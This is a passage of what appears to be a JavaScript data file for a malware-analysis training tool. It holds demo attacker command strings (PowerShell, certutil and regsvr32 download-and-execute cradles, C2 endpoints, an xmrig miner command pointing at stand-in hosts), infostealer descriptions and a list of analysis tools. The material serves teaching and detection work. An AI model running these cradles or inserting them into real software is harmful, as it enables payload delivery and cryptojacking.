...
export const DEMO_SAMPLE = [
  ...
  '',
  '# Download-and-stage cradle from documentation/demo infrastructure only',
  'Invoke-WebRequest -Uri "http://billing-docs.example.com/files/evil.exe" -OutFile "C:\\Windows\\Temp\\evil.exe"',
  'certutil -urlcache -split -f http://203.0.113.44/payload.bin "C:\\Windows\\Temp\\p.bin"',
  'regsvr32 /s /u /i:http://update-server.example.net/sct.sct scrobj.dll',
  '# C2 beacon endpoints (RFC 5737 documentation/test IPs — safe demo only)',
  'C2: 198.51.100.27:8443  fallback 192.0.2.55:443',
  ...
  'xmrig -o stratum+tcp://update-server.example.net:443 -u 4xMoneroWalletExample',
  '',
...
export const KB_DATA = [
  ...
  { name: 'LummaC2 (Lumma Stealer)', type: 'infostealer', active: true, desc: 'Leading infostealer. Harvests browser credentials, crypto wallets, authentication artifacts, and session cookies. MaaS model sold on underground forums. Recovered quickly after coordinated takedown attempts.', chips: ['MaaS', 'Browser creds', 'Session hijack'] },
  ...
  { name: 'Vidar Stealer', type: 'infostealer', active: true, desc: 'Established infostealer based on the Arkei codebase. Harvests credentials, browser history, crypto wallets, and authentication artifacts. Delivered via malspam and fake crack sites.', chips: ['Arkei fork', 'Crypto wallets', 'MaaS'] },
...
export const TOOLS_DATA = [
  ...
  { name: 'FLARE VM', cat: 'Analysis Distro (Windows)', desc: "Mandiant's Windows-based RE environment. Installs Ghidra, x64dbg, IDA Free, PEStudio, CAPA, ProcMon, FakeNet-NG and more.", use: 'Use the official FLARE VM installation guide.', free: true },
  ...
  { name: 'CyberChef', cat: 'Data Transformation', desc: 'Data transformation tool with operations for encoding, decoding, deobfuscation, hashing, and parsing.', use: 'Use the official CyberChef release or a trusted local copy.', free: true },
